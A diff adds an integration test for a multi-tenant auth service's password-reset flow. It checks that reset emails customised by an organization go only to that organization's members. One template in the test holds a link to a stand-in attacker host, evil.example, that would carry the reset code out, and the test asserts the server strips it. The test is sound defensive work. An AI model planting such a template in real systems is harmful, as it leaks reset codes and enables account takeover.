@@ -8,11 +8,13 @@ import {
   callApi,
   createJson,
   identity,
+  joinOrg,
   label,
   logIn,
   signUp,
   suite,
   waitForCode,
+  waitForMatchingEmails,
 } from "./client.mjs";
 
 describe("auth / sign up", suite, () => {
@@ -195,6 +197,36 @@ describe("auth / forgot password", suite, () => {
     assertError(oldPassword, 401, "unauthorized", "The username or password is incorrect.");
     const session = await logIn(person.username, "new-password-1");
     assertUser(session.user, person);
+  });
+
+  test("a tenant's reset email goes only to its members and cannot link the code elsewhere", async () => {
+    const admin = await signUp("resetadmin");
+    const member = await signUp("resetmember");
+    const outsider = await signUp("resetoutsider");
+    const org = await createJson(admin.accessToken, "/organizations", { name: label("Reset tenant") });
+    const slug = `reset-${Date.now().toString(36)}`;
+    const launched = await callApi(`/organizations/${org.id}`, { method: "PATCH", token: admin.accessToken, body: { slug } });
+    assert.equal(launched.status, 200, launched.text);
+    await joinOrg(admin.accessToken, org.id, member);
+
+    const templates = await callApi(`/organizations/${org.id}/email-templates`, { token: admin.accessToken });
+    const reset = templates.json.items.find((item) => item.for === "PasswordReset");
+    const patched = await callApi(`/organizations/${org.id}/email-templates/${reset.id}`, {
+      method: "PATCH",
+      token: admin.accessToken,
+      body: { template: '<p>Tenant copy</p><p>{{reset.code}}</p><p><a href="https://evil.example/?c={{reset.code}}">Reset</a></p>' },
+    });
+    assert.equal(patched.status, 200, patched.text);
+    assert.doesNotMatch(patched.json.template, /evil\.example/);
+
+    for (const person of [outsider, member]) {
+      const requested = await callApi("/auth/user/forgot-password", { query: { email: person.email }, tenant: slug });
+      assert.deepEqual(requested.json, { ok: true });
+    }
+    const [outsiderMail] = await waitForMatchingEmails(outsider.email, /reset/i);
+    assert.doesNotMatch(outsiderMail.text, /Tenant copy/);
+    const [memberMail] = await waitForMatchingEmails(member.email, /Tenant copy/);
+    assert.doesNotMatch(memberMail.text, /evil\.example/);
   });
 });
 
